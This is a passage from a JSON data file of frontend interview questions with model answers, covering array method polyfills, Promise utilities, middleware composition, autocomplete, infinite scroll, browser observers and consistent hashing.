+    "answer": "Array.prototype.myMap = function(callback, thisArg) {\n  if (typeof callback !== 'function') {\n    throw new TypeError(callback + ' is not a function')\n  }\n\n  const result = new Array(this.length)\n\n  for (let i = 0; i < this.length; i++) {\n    // Skip holes in sparse arrays (same as native map)\n    if (Object.prototype.hasOwnProperty.call(this, i)) {\n      result[i] = callback.call(thisArg, this[i], i, this)\n    }\n  }\n\n  return result\n}\n\n// Test\n;[1, 2, 3].myMap(x => x * 2)       // [2, 4, 6]\n;[1, 2, 3].myMap((x, i) => i + x)  // [1, 3, 5]\n\n// With thisArg\nconst multiplier = { factor: 3 }\n;[1, 2, 3].myMap(function(x) {\n  return x * this.factor\n}, multiplier)   // [3, 6, 9]",
+    "order": 24
+  },
+  {
+    "id": "array-reduce",
+    "companies": [
+      "Apple",
+      "Meta"
+    ],
+    "title": "Implement Array.prototype.reduce from scratch",
+    "difficulty": "medium",
+    "category": "ES6+",
+    "description": "Implement `Array.prototype.myReduce` that behaves identically to the native `reduce`. Handle both the case where an initial value is provided and when it is not.",
+    "answerType": "code",
+    "tags": [
+      "arrays",
+      "prototype",
+      "accumulator"
+    ],
+    "source": "frontendinterviewhandbook.com — Apple",
+    "answer": "Array.prototype.myReduce = function(callback, initialValue) {\n  if (typeof callback !== 'function') {\n    throw new TypeError(callback + ' is not a function')\n  }\n\n  const arr = this\n  let accumulator\n  let startIndex\n\n  if (arguments.length >= 2) {\n    accumulator = initialValue\n    startIndex = 0\n  } else {\n    if (arr.length === 0) {\n      throw new TypeError('Reduce of empty array with no initial value')\n    }\n    accumulator = arr[0]\n    startIndex = 1\n  }\n\n  for (let i = startIndex; i < arr.length; i++) {\n    if (Object.prototype.hasOwnProperty.call(arr, i)) {\n      accumulator = callback(accumulator, arr[i], i, arr)\n    }\n  }\n\n  return accumulator\n}\n\n// Tests\n;[1, 2, 3, 4].myReduce((acc, x) => acc + x, 0)  // 10\n;[1, 2, 3, 4].myReduce((acc, x) => acc + x)      // 10\n;['a','b','c'].myReduce((acc, x) => acc + x)      // \"abc\"",
+    "order": 25
+  },
+  {
+    "id": "compose-middleware",
+    "companies": [
+      "TikTok",
+      "Stripe"
+    ],
+    "title": "Implement compose / middleware pipeline",
+    "difficulty": "hard",
+    "category": "Performance",
+    "description": "Implement a `compose` function (right-to-left) and a Koa/Express-style `applyMiddleware` that chains async middleware with `next()`. This is the core of most web framework middleware systems.",
+    "answerType": "code",
+    "tags": [
+      "functional programming",
+      "middleware",
+      "async",
+      "compose"
+    ],
+    "source": "frontendinterviewhandbook.com — TikTok",
+    "answer": "// compose(f, g, h)(x) = f(g(h(x))) — right to left\nfunction compose(...fns) {\n  return (x) => fns.reduceRight((acc, fn) => fn(acc), x)\n}\n\n// pipe(f, g, h)(x) = h(g(f(x))) — left to right\nconst pipe = (...fns) => (x) => fns.reduce((acc, fn) => fn(acc), x)\n\n// Usage\nconst double = x => x * 2\nconst addOne = x => x + 1\nconst square = x => x * x\n\ncompose(square, addOne, double)(3)  // square(addOne(double(3))) = 49\npipe(double, addOne, square)(3)     // square(addOne(double(3))) = 49\n\n// ─────────────────────────────────────────────────────────\n// Koa-style async middleware (like TikTok/Express internals)\nfunction applyMiddleware(middlewares) {\n  return function(ctx) {\n    function dispatch(i) {\n      if (i >= middlewares.length) return Promise.resolve()\n      const middleware = middlewares[i]\n      return Promise.resolve(middleware(ctx, () => dispatch(i + 1)))\n    }\n    return dispatch(0)\n  }\n}\n\n// Usage\nconst logger = async (ctx, next) => {\n  console.log('before', ctx.url)\n  await next()\n  console.log('after', ctx.url)\n}\nconst handler = async (ctx, next) => {\n  ctx.body = 'Hello'\n  await next()\n}\nconst run = applyMiddleware([logger, handler])\nrun({ url: '/home' })",
+    "order": 26
+  },
+  {
+    "id": "store-data",
+    "companies": [
+      "Airbnb"
+    ],
+    "title": "Implement a reactive StoreData class",
+    "difficulty": "medium",
+    "category": "Performance",
+    "description": "Implement a `StoreData` class with `addData(key, value)` and `listenToKey(key, callback)` methods. The callback fires whenever a specific key's value changes. This mirrors a simplified reactive store like Zustand or Redux.",
+    "answerType": "code",
+    "tags": [
+      "observer pattern",
+      "classes",
+      "reactivity"
+    ],
+    "source": "frontendinterviewhandbook.com — Airbnb",
+    "answer": "class StoreData {\n  constructor() {\n    this._data = {}\n    this._listeners = {}  // key → Set of callbacks\n  }\n\n  addData(key, value) {\n    const oldValue = this._data[key]\n    this._data[key] = value\n\n    // Notify listeners only if value changed\n    if (oldValue !== value && this._listeners[key]) {\n      this._listeners[key].forEach(cb => cb(value, oldValue))\n    }\n  }\n\n  listenToKey(key, callback) {\n    if (!this._listeners[key]) this._listeners[key] = new Set()\n    this._listeners[key].add(callback)\n\n    // Return unsubscribe function\n    return () => this._listeners[key].delete(callback)\n  }\n\n  getData(key) {\n    return this._data[key]\n  }\n}\n\n// Usage\nconst store = new StoreData()\n\nconst unsub = store.listenToKey('count', (newVal, oldVal) => {\n  console.log(`count changed: ${oldVal} → ${newVal}`)\n})\n\nstore.addData('count', 1)   // \"count changed: undefined → 1\"\nstore.addData('count', 2)   // \"count changed: 1 → 2\"\nstore.addData('count', 2)   // (no event — same value)\nunsub()\nstore.addData('count', 3)   // (no event — unsubscribed)",
+    "order": 27
+  },
+  {
+    "id": "autocomplete",
+    "companies": [
+      "Airbnb",
+      "Amazon",
+      "Google",
+      "Tenable"
+    ],
+    "title": "Design an autocomplete / type-ahead component",
+    "difficulty": "hard",
+    "category": "System Design",
+    "description": "Design and implement an autocomplete input that fetches suggestions from an API as the user types. Handle debouncing, race conditions, keyboard navigation, and accessibility.",
+    "answerType": "code",
+    "tags": [
+      "debounce",
+      "async",
+      "race conditions",
+      "a11y",
+      "UX"
+    ],
+    "source": "frontendinterviewhandbook.com — Airbnb",
+    "answer": "class Autocomplete {\n  constructor(inputEl, fetchFn, options = {}) {\n    this.input = inputEl\n    this.fetch = fetchFn\n    this.delay = options.delay ?? 300\n    this.minChars = options.minChars ?? 2\n\n    this.listEl = this._createList()\n    this.timer = null\n    this.activeRequest = null\n    this.activeIndex = -1\n\n    this.input.addEventListener('input',   e => this._onInput(e))\n    this.input.addEventListener('keydown', e => this._onKeydown(e))\n    this.input.setAttribute('autocomplete', 'off')\n    this.input.setAttribute('aria-autocomplete', 'list')\n    this.input.setAttribute('role', 'combobox')\n  }\n\n  _onInput({ target: { value } }) {\n    clearTimeout(this.timer)\n    if (value.length < this.minChars) return this._hide()\n\n    this.timer = setTimeout(async () => {\n      // Cancel any pending request (race condition fix)\n      const requestId = Symbol()\n      this.activeRequest = requestId\n\n      const results = await this.fetch(value)\n\n      if (this.activeRequest !== requestId) return  // stale\n\n      this._render(results)\n    }, this.delay)\n  }\n\n  _onKeydown(e) {\n    const items = this.listEl.querySelectorAll('[role=\"option\"]')\n    if (e.key === 'ArrowDown') {\n      e.preventDefault()\n      this.activeIndex = Math.min(this.activeIndex + 1, items.length - 1)\n    } else if (e.key === 'ArrowUp') {\n      e.preventDefault()\n      this.activeIndex = Math.max(this.activeIndex - 1, -1)\n    } else if (e.key === 'Enter' && this.activeIndex >= 0) {\n      items[this.activeIndex]?.click()\n    } else if (e.key === 'Escape') {\n      this._hide()\n    }\n    items.forEach((item, i) =>\n      item.setAttribute('aria-selected', String(i === this.activeIndex))\n    )\n  }\n\n  _render(items) {\n    this.listEl.innerHTML = ''\n    this.activeIndex = -1\n    items.forEach(text => {\n      const li = document.createElement('li')\n      li.textContent = text\n      li.setAttribute('role', 'option')\n      li.addEventListener('click', () => {\n        this.input.value = text\n        this._hide()\n      })\n      this.listEl.appendChild(li)\n    })\n    this.listEl.hidden = items.length === 0\n  }\n\n  _hide() { this.listEl.hidden = true }\n\n  _createList() {\n    const ul = document.createElement('ul')\n    ul.setAttribute('role', 'listbox')\n    ul.hidden = true\n    this.input.parentNode.appendChild(ul)\n    return ul\n  }\n}\n\n// Usage\nconst inputEl = document.querySelector('#search')\nconst fetchFn = async (q) => {\n  const r = await fetch('/api/suggest?q=' + encodeURIComponent(q))\n  return r.json()\n}\nnew Autocomplete(inputEl, fetchFn, { delay: 250, minChars: 2 })",
+    "order": 28
+  },
+  {
+    "id": "infinite-scroll",
+    "companies": [
+      "Amazon",
+      "Netflix",
+      "Meta"
+    ],
+    "title": "Implement infinite scroll with IntersectionObserver",
+    "difficulty": "medium",
+    "category": "System Design",
+    "description": "Implement an infinite-scrolling list that fetches the next page of data when the user reaches the bottom of the list, using IntersectionObserver instead of scroll events.",
+    "answerType": "code",
+    "tags": [
+      "IntersectionObserver",
+      "pagination",
+      "performance",
+      "async"
+    ],
+    "answer": "class InfiniteScroll {\n  constructor(container, fetchPage) {\n    this.container = container\n    this.fetchPage = fetchPage\n    this.page = 1\n    this.loading = false\n    this.done = false\n\n    // Sentinel element sits at the bottom of the list\n    this.sentinel = document.createElement('div')\n    container.appendChild(this.sentinel)\n\n    this.observer = new IntersectionObserver(\n      ([entry]) => { if (entry.isIntersecting) this._load() },\n      { rootMargin: '200px 0px' }  // pre-fetch 200px before visible\n    )\n    this.observer.observe(this.sentinel)\n  }\n\n  async _load() {\n    if (this.loading || this.done) return\n    this.loading = true\n    this._showSpinner()\n\n    const items = await this.fetchPage(this.page)\n\n    if (!items.length) {\n      this.done = true\n      this.observer.disconnect()\n    } else {\n      items.forEach(item => {\n        const el = document.createElement('div')\n        el.className = 'item'\n        el.textContent = item.title\n        this.container.insertBefore(el, this.sentinel)\n      })\n      this.page++\n    }\n\n    this._hideSpinner()\n    this.loading = false\n  }\n\n  _showSpinner() { this.sentinel.textContent = 'Loading…' }\n  _hideSpinner() { this.sentinel.textContent = '' }\n}\n\n// Usage\nconst container = document.querySelector('#feed')\nconst fetchPage = async (page) => {\n  const r = await fetch('/api/feed?page=' + page)\n  return r.json()\n}\nconst infiniteList = new InfiniteScroll(container, fetchPage)\nvoid infiniteList",
+    "order": 29
+  },
+  {
+    "id": "group-by-dictionary",
+    "companies": [
+      "DriveNets"
+    ],
+    "title": "Implement Dictionary `groupBy` utility",
+    "difficulty": "medium",
+    "category": "Algorithms",
+    "description": "Given an array and a key selector, group items into a dictionary where each key maps to all matching items. Handle both function selectors and property-name selectors.",
+    "answerType": "code",
+    "tags": [
+      "groupBy",
+      "Map",
+      "array utilities"
+    ],
+    "source": "Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm",
+    "answer": "// Interview explanation:\n// groupBy is O(n): scan once and bucket each item by computed key.\n// Main edge cases interviewers expect:\n// - selector is either a function or a property name\n// - undefined/null keys are still grouped deterministically\n// - stable order inside each group follows input order\n\nfunction groupBy(items, selector) {\n  const getKey =\n    typeof selector === 'function'\n      ? selector\n      : (item) => item?.[selector]\n\n  return items.reduce((acc, item) => {\n    const key = String(getKey(item))\n    if (!acc[key]) acc[key] = []\n    acc[key].push(item)\n    return acc\n  }, {})\n}\n\n// Usage\nconst users = [\n  { id: 1, team: 'A' },\n  { id: 2, team: 'B' },\n  { id: 3, team: 'A' },\n]\n\ngroupBy(users, 'team')\n// { A: [{id:1, team:'A'}, {id:3, team:'A'}], B: [{id:2, team:'B'}] }\n\ngroupBy(users, (u) => u.id % 2 === 0 ? 'even' : 'odd')\n// { odd: [{id:1...}, {id:3...}], even: [{id:2...}] }\n\n// Follow-up discussion:\n// - Use Map instead of object when keys are not strings.\n// - For large datasets, avoid JSON stringify key generation.\n//\n// Common interviewer follow-ups:\n// Q: Complexity?\n// A: Time is O(n) and extra space is O(n) in the worst case.\n// Q: How to preserve insertion order of groups?\n// A: Use Map for buckets; it preserves insertion order and supports non-string keys.\n// Q: How to handle multi-key grouping?\n// A: Apply nested grouping (group by key A, then group each bucket by key B).",
+    "order": 30
+  },
+  {
+    "id": "debounce-throttle-memoize-explain",
+    "companies": [
+      "DriveNets"
+    ],
+    "title": "Explain debounce vs throttle vs memoize",
+    "difficulty": "medium",
+    "category": "Performance",
+    "description": "Interviewers ask when to use debounce, throttle, and memoization, and how they differ in behavior. Explain each with practical frontend examples.",
+    "answerType": "mixed",
+    "tags": [
+      "debounce",
+      "throttle",
+      "memoize",
+      "performance"
+    ],
+    "source": "Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm",
+    "answer": "// Debounce: run after user stops triggering events for delay ms.\n// Best for: search input, autosave, expensive validation.\n// Behavior: many rapid calls -> one final call.\n\n// Throttle: run at most once per interval.\n// Best for: scroll, resize, drag pointer updates.\n// Behavior: many rapid calls -> periodic calls.\n\n// Memoize: cache function outputs for identical inputs.\n// Best for: pure expensive computations.\n// Behavior: repeated same args -> instant cached result.\n\n// Interview framing:\n// - Debounce controls \"when\" execution happens (after quiet time).\n// - Throttle controls \"how often\" execution can happen.\n// - Memoize controls \"whether recomputation is needed\".\n\n// Usage examples:\nconst onSearch = debounce((q) => api.search(q), 300)\ninput.addEventListener('input', (e) => onSearch(e.target.value))\n\nconst onScroll = throttle(() => updateVisibleRows(), 100)\nwindow.addEventListener('scroll', onScroll)\n\nconst fib = memoize((n) => (n < 2 ? n : fib(n - 1) + fib(n - 2)))\nfib(40) // first call expensive\nfib(40) // cached\n//\n// Common interviewer follow-ups:\n// Q: Leading/trailing behavior for debounce/throttle?\n// A: Debounce is usually trailing by default; throttle is often leading with optional trailing.\n// Q: How to cancel pending debounce/throttle calls?\n// A: Expose cancel() to clear timers and optionally flush() to run pending work immediately.\n// Q: Memoization pitfalls?\n// A: Non-serializable args break naive keying, and unbounded caches can leak memory.",
+    "order": 31
+  },
+  {
+    "id": "observers-for-dynamic-ui",
+    "companies": [
+      "DriveNets"
+    ],
+    "title": "When to use IntersectionObserver, ResizeObserver, and MutationObserver",
+    "difficulty": "medium",
+    "category": "DOM & Browser",
+    "description": "Explain which browser observer to use for infinite-scroll detection, element size/position changes, and DOM structure changes. Provide a practical composition pattern for real UIs.",
+    "answerType": "mixed",
+    "tags": [
+      "IntersectionObserver",
+      "ResizeObserver",
+      "MutationObserver",
+      "UI architecture"
+    ],
+    "source": "Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm",
+    "answer": "// Interview explanation:\n// Choose observer by signal type:\n// - visibility signal -> IntersectionObserver\n// - size signal -> ResizeObserver\n// - DOM structure/content signal -> MutationObserver\n// Combining them gives robust UI updates without heavy polling.\n\n// Observer choice:\n// 1) IntersectionObserver: visibility in viewport/root (e.g. infinite scroll sentinel)\n// 2) ResizeObserver: element size changes (e.g. popover width/height changes)\n// 3) MutationObserver: DOM tree/content changes (e.g. async content inserted)\n\nfunction wireDynamicList(listEl, sentinelEl, onLoadMore) {\n  const io = new IntersectionObserver(([entry]) => {\n    if (entry.isIntersecting) onLoadMore()\n  }, { rootMargin: '200px 0px' })\n\n  const ro = new ResizeObserver(() => {\n    // recalc layout-dependent positions, sticky offsets, etc.\n    requestAnimationFrame(() => {\n      // measure and update layout here\n    })\n  })\n\n  const mo = new MutationObserver(() => {\n    // content changed -> potentially re-measure / re-attach behaviors\n    requestAnimationFrame(() => {\n      // sync derived UI state\n    })\n  })\n\n  io.observe(sentinelEl)\n  ro.observe(listEl)\n  mo.observe(listEl, { childList: true, subtree: true })\n\n  return () => {\n    io.disconnect()\n    ro.disconnect()\n    mo.disconnect()\n  }\n}\n\n// Usage:\nconst cleanup = wireDynamicList(\n  document.querySelector('#list'),\n  document.querySelector('#sentinel'),\n  () => fetchNextPage()\n)\n// later: cleanup()\n\n// Follow-up discussion:\n// - Batch DOM reads/writes via requestAnimationFrame.\n// - Disconnect observers on unmount to avoid leaks.\n//\n// Common interviewer follow-ups:\n// Q: Why not polling or scroll events?\n// A: Polling wastes CPU, and scroll handlers are noisy; observers are browser-optimized and event-driven.\n// Q: Which observer can trigger too often?\n// A: ResizeObserver and MutationObserver; debounce expensive work and batch with rAF.\n// Q: How to prevent feedback loops?\n// A: Avoid mutating observed nodes directly in callbacks without guards; batch and short-circuit updates.",
+    "order": 32
+  },
+  {
+    "id": "dropdown-positioning-and-portals",
+    "companies": [
+      "DriveNets"
+    ],
+    "title": "Design robust dropdown positioning (top/bottom) with portals",
+    "difficulty": "hard",
+    "category": "System Design",
+    "description": "Design a dropdown/popover that chooses top or bottom placement based on available viewport space, avoids clipping, and renders in a portal when parent overflow would hide it.",
+    "answerType": "mixed",
+    "tags": [
+      "dropdown",
+      "portals",
+      "positioning",
+      "UX"
+    ],
+    "source": "Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm",
+    "answer": "// Interview explanation:\n// A dropdown must avoid clipping and choose placement by available space.\n// Portals solve clipping from parent overflow/stacking contexts.\n// Recompute placement whenever geometry can change.\n\nfunction computePlacement(anchorRect, menuHeight, viewportHeight, gap = 8) {\n  const spaceBelow = viewportHeight - anchorRect.bottom\n  const spaceAbove = anchorRect.top\n\n  if (spaceBelow >= menuHeight + gap) return 'bottom'\n  if (spaceAbove >= menuHeight + gap) return 'top'\n  return spaceBelow >= spaceAbove ? 'bottom' : 'top' // fallback\n}\n\n// Typical approach:\n// 1) Measure anchor/menu with getBoundingClientRect\n// 2) Compute placement using available space\n// 3) Render menu in a portal (e.g. document.body) to escape overflow clipping\n// 4) Recompute on resize/scroll/content changes (ResizeObserver + listeners)\n// 5) Keep a11y: role=\"listbox\"/\"menu\", keyboard nav, focus trap when needed\n\n// Usage:\nconst anchorRect = button.getBoundingClientRect()\nconst menuHeight = menu.offsetHeight\nconst placement = computePlacement(anchorRect, menuHeight, window.innerHeight)\nmenu.dataset.placement = placement // \"top\" | \"bottom\"\n//\n// Common interviewer follow-ups:\n// Q: Complexity?\n// A: Placement computation is O(1) per recompute.\n// Q: Handling nested scroll containers?\n// A: Recompute on the nearest scroll parents, not only window scroll.\n// Q: Avoiding layout thrash?\n// A: Batch all reads first, then writes in requestAnimationFrame.",
+    "order": 33
+  },
+  {
+    "id": "svg-vs-canvas-tradeoffs",
+    "companies": [
+      "DriveNets"
+    ],
+    "title": "SVG vs Canvas for large-scale rendering",
+    "difficulty": "medium",
+    "category": "Performance",
+    "description": "Compare SVG and Canvas for rendering many visual elements in UI-heavy apps. Explain when Canvas is preferred and what trade-offs exist for interactivity and accessibility.",
+    "answerType": "text",
+    "tags": [
+      "SVG",
+      "Canvas",
+      "rendering",
+      "performance"
+    ],
+    "source": "Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm",
+    "answer": "Interview explanation:\n- This is a trade-off question, not a one-word answer.\n- Interviewers look for a decision framework: element count, redraw frequency, interaction model, and accessibility needs.\n\n- SVG is DOM-based and ideal for a smaller number of highly interactive, accessible vector elements.\n- Canvas is immediate-mode pixel rendering and often performs better for very large numbers of objects.\n- SVG pros: CSS styling, built-in DOM events per element, easier accessibility semantics.\n- SVG cons: thousands of nodes can become expensive (layout/paint/memory).\n- Canvas pros: efficient bulk drawing, lower DOM overhead for dense scenes.\n- Canvas cons: manual hit-testing, more custom code for interactions and accessibility.\n- Rule of thumb: choose SVG for rich per-element interaction; choose Canvas for massive datasets or frequent redraw-heavy visualizations.\n\nUsage examples:\n- Use SVG for a workflow editor with selectable nodes/edges and keyboard focus.\n- Use Canvas for a heatmap/chart with 50k+ points and frequent redraws.\n- Use hybrid: canvas for heavy rendering + SVG/HTML overlay for tooltips/selection.\n\nCommon interviewer follow-ups:\n- Q: Hybrid strategy?\n- A: Render dense primitives on canvas and layer SVG/HTML for hit targets and tooltips.\n- Q: Accessibility plan for canvas-heavy UIs?\n- A: Provide semantic mirrors, keyboard navigation paths, and ARIA announcements.\n- Q: How to validate the choice?\n- A: Profile FPS, frame time, memory, and input latency with realistic datasets.",
+    "order": 34
+  },
+  {
+    "id": "promise-any",
+    "companies": [
+      "Google",
+      "Meta",
+      "Amazon"
+    ],
+    "title": "Implement Promise.any(promises)",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Implement `Promise.any` from scratch. It should resolve with the first fulfilled promise and only reject when all promises reject, with an aggregate error.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "async",
+      "concurrency"
+    ],
+    "answer": "function promiseAny(promises) {\n  return new Promise((resolve, reject) => {\n    if (promises.length === 0) {\n      return reject(new AggregateError([], 'All promises were rejected'))\n    }\n\n    const errors = new Array(promises.length)\n    let rejectedCount = 0\n\n    promises.forEach((p, i) => {\n      Promise.resolve(p)\n        .then(resolve) // first success wins immediately\n        .catch((err) => {\n          errors[i] = err\n          rejectedCount++\n          if (rejectedCount === promises.length) {\n            reject(new AggregateError(errors, 'All promises were rejected'))\n          }\n        })\n    })\n  })\n}\n\n// Usage\npromiseAny([\n  Promise.reject('fail-1'),\n  new Promise((res) => setTimeout(() => res('ok'), 50)),\n  Promise.reject('fail-2'),\n]).then(console.log) // \"ok\"",
+    "order": 35
+  },
+  {
+    "id": "flatten-object-paths",
+    "companies": [
+      "Amazon",
+      "Stripe",
+      "Uber"
+    ],
+    "title": "Flatten nested object keys into dot paths",
+    "difficulty": "medium",
+    "category": "Algorithms",
+    "description": "Given a nested object, return a flat object where keys are dot-separated paths. Arrays should use numeric indices in the path.",
+    "answerType": "code",
+    "tags": [
+      "recursion",
+      "objects",
+      "data transformation"
+    ],
+    "answer": "function flattenObject(input) {\n  const out = {}\n\n  function walk(value, path) {\n    if (value === null || typeof value !== 'object') {\n      out[path] = value\n      return\n    }\n\n    if (Array.isArray(value)) {\n      if (value.length === 0) out[path] = []\n      value.forEach((item, i) => {\n        const next = path ? `${path}.${i}` : String(i)\n        walk(item, next)\n      })\n      return\n    }\n\n    const keys = Object.keys(value)\n    if (keys.length === 0 && path) out[path] = {}\n    for (const key of keys) {\n      const next = path ? `${path}.${key}` : key\n      walk(value[key], next)\n    }\n  }\n\n  walk(input, '')\n  return out\n}\n\n// Usage\nflattenObject({\n  user: { name: 'Ana', address: { city: 'TLV' } },\n  tags: ['a', 'b']\n})\n// {\n//   \"user.name\": \"Ana\",\n//   \"user.address.city\": \"TLV\",\n//   \"tags.0\": \"a\",\n//   \"tags.1\": \"b\"\n// }",
+    "order": 36
+  },
+  {
+    "id": "react-key-reconciliation",
+    "companies": [
+      "Meta",
+      "Airbnb",
+      "TikTok",
+      "Tenable"
+    ],
+    "title": "Why React list keys matter (and bad key bugs)",
+    "difficulty": "easy",
+    "category": "Performance",
+    "description": "Explain how React uses keys during reconciliation, why index keys can break stateful list items, and when index keys are acceptable.",
+    "answerType": "mixed",
+    "tags": [
+      "react",
+      "reconciliation",
+      "rendering",
+      "lists"
+    ],
+    "answer": "Interview explanation:\n- Keys let React identify which child is the \"same\" between renders.\n- Stable keys preserve local component state (input values, focus, animations).\n- Unstable keys (array index for reordered lists) can move state to the wrong row.\n\nBad example (index key with reordering):\n```jsx\n{items.map((item, index) => (\n  <TodoRow key={index} item={item} />\n))}\n```\nIf one item is inserted at the top, all following rows get new keys and may reuse wrong state.\n\nBetter:\n```jsx\n{items.map((item) => (\n  <TodoRow key={item.id} item={item} />\n))}\n```\n\nWhen index keys are acceptable:\n- The list is static (never reordered, inserted, or removed).\n- Items have no stable ID and rows are purely presentational (no local state).\n\nRule of thumb:\n- Use stable domain IDs for dynamic lists.\n- Treat key selection as a correctness decision, not only a warning fix.",
+    "order": 37
+  },
+  {
+    "id": "consistent-hashing-design",
+    "companies": [
+      "Netflix",
+      "Amazon",
+      "Google"
+    ],
+    "title": "Design consistent hashing for cache sharding",
+    "difficulty": "hard",
+    "category": "System Design",
+    "description": "Design a consistent hashing strategy for distributing cache keys across servers so that adding/removing nodes causes minimal key remapping.",
+    "answerType": "text",
+    "tags": [
+      "distributed systems",
+      "caching",
+      "sharding"
+    ],
+    "answer": "Interview explanation:\n- Consistent hashing maps both servers and keys onto the same hash ring.\n- A key is assigned to the first server clockwise from the key hash.\n- When a server joins/leaves, only nearby keys remap, not the full keyspace.\n\nCore design:\n1) Hash ring (e.g. 0..2^32-1) with sorted server positions.\n2) Virtual nodes per physical server (e.g. 100-500) for better load balance.\n3) Lookup: hash(key) -> binary search first vnode >= hash, wrap to start if needed.\n4) Replication: choose next N distinct physical servers clockwise.\n5) Health-aware routing: skip unhealthy nodes during reads/writes.\n\nOperational concerns:\n- Rebalancing rate limits to avoid thundering migrations.\n- Warm-up strategy for new nodes (background prefill).\n- Observability: per-node hit rate, memory pressure, key distribution skew.\n- Failure mode: temporary increase in misses; mitigate with multi-layer cache (L1+L2).\n\nComplexity:\n- Lookup is O(log V) with binary search on V virtual nodes.\n- Space is O(V).",
+    "order": 38
+  },
+  {
+    "id": "promise-race",
+    "companies": [
+      "Google",
+      "Amazon",
+      "Meta"
+    ],
+    "title": "Implement Promise.race(promises)",
+    "difficulty": "easy",
+    "category": "Async & Promises",
+    "description": "Implement `Promise.race` from scratch. It should settle as soon as the first input promise settles (resolve or reject).",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "async",
+      "polyfill"
+    ],
+    "answer": "function promiseRace(promises) {\n  return new Promise((resolve, reject) => {\n    for (const p of promises) {\n      Promise.resolve(p).then(resolve, reject)\n    }\n  })\n}\n\n// Usage\npromiseRace([\n  new Promise((res) => setTimeout(() => res('slow'), 100)),\n  new Promise((res) => setTimeout(() => res('fast'), 20)),\n]).then(console.log) // \"fast\"",
+    "order": 39
+  },
+  {
+    "id": "promise-finally-polyfill",
+    "companies": [
+      "Apple",
+      "Stripe",
+      "Uber"
+    ],
+    "title": "Implement Promise.prototype.finally",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Implement a `finally` polyfill that runs a callback regardless of resolve/reject, while preserving the original outcome.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "polyfill",
+      "error handling"
+    ],
+    "answer": "if (!Promise.prototype.myFinally) {\n  Promise.prototype.myFinally = function (onFinally) {\n    const P = this.constructor\n    const handler =\n      typeof onFinally === 'function' ? onFinally : () => undefined\n\n    return this.then(\n      (value) => P.resolve(handler()).then(() => value),\n      (reason) =>\n        P.resolve(handler()).then(() => {\n          throw reason\n        })\n    )\n  }\n}\n\n// Usage\nPromise.resolve('ok')\n  .myFinally(() => console.log('cleanup'))\n  .then(console.log) // cleanup, ok\n\nPromise.reject('err')\n  .myFinally(() => console.log('cleanup'))\n  .catch(console.error) // cleanup, err",
+    "order": 40
+  },
+  {
+    "id": "promise-retry-backoff",
+    "companies": [
+      "Amazon",
+      "Netflix",
+      "Google"
+    ],
+    "title": "Implement retry(fn, retries, delay) with backoff",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Implement a Promise-based retry utility for flaky APIs. Retry failed async calls with exponential backoff and stop after max retries.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "retry",
+      "backoff",
+      "resilience"
+    ],
+    "answer": "function sleep(ms) {\n  return new Promise((resolve) => setTimeout(resolve, ms))\n}\n\nasync function retry(fn, retries = 3, baseDelay = 100) {\n  let attempt = 0\n  let lastError\n\n  while (attempt <= retries) {\n    try {\n      return await fn()\n    } catch (err) {\n      lastError = err\n      if (attempt === retries) break\n\n      const wait = baseDelay * 2 ** attempt // exponential backoff\n      await sleep(wait)\n      attempt++\n    }\n  }\n\n  throw lastError\n}\n\n// Usage\nlet calls = 0\nretry(async () => {\n  calls++\n  if (calls < 3) throw new Error('temporary')\n  return 'success'\n}, 4, 50).then(console.log)",
+    "order": 41
+  },
+  {
+    "id": "promise-pool-concurrency",
+    "companies": [
+      "Meta",
+      "TikTok",
+      "Stripe"
+    ],
+    "title": "Implement Promise pool with concurrency limit",
+    "difficulty": "hard",
+    "category": "Async & Promises",
+    "description": "Given async task functions and a concurrency limit, implement a scheduler that runs at most N tasks in parallel and returns results in original order.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "concurrency",
+      "scheduling"
+    ],
+    "answer": "async function runWithLimit(tasks, limit) {\n  if (limit <= 0) throw new Error('limit must be > 0')\n  const results = new Array(tasks.length)\n  let nextIndex = 0\n\n  async function worker() {\n    while (nextIndex < tasks.length) {\n      const current = nextIndex\n      nextIndex++\n      results[current] = await tasks[current]()\n    }\n  }\n\n  const workers = Array.from(\n    { length: Math.min(limit, tasks.length) },\n    () => worker()\n  )\n\n  await Promise.all(workers)\n  return results\n}\n\n// Usage\nconst tasks = [\n  () => Promise.resolve(1),\n  () => new Promise((r) => setTimeout(() => r(2), 30)),\n  () => Promise.resolve(3),\n]\nrunWithLimit(tasks, 2).then(console.log) // [1, 2, 3]",
+    "order": 42
+  },
+  {
+    "id": "promise-timeout-wrapper",
+    "companies": [
+      "Amazon",
+      "Google",
+      "Netflix"
+    ],
+    "title": "Wrap a promise with timeout",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Implement `withTimeout(promise, ms)` that rejects with a timeout error if the original promise does not settle in time.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "timeout",
+      "error handling"
+    ],
+    "answer": "function withTimeout(promise, ms, message = 'Operation timed out') {\n  return new Promise((resolve, reject) => {\n    const timer = setTimeout(() => {\n      reject(new Error(message))\n    }, ms)\n\n    Promise.resolve(promise)\n      .then((value) => {\n        clearTimeout(timer)\n        resolve(value)\n      })\n      .catch((err) => {\n        clearTimeout(timer)\n        reject(err)\n      })\n  })\n}\n\n// Usage\nwithTimeout(new Promise((res) => setTimeout(() => res('ok'), 30)), 100)\n  .then(console.log) // ok\n\nwithTimeout(new Promise((res) => setTimeout(() => res('late'), 200)), 50)\n  .catch((e) => console.error(e.message)) // Operation timed out",
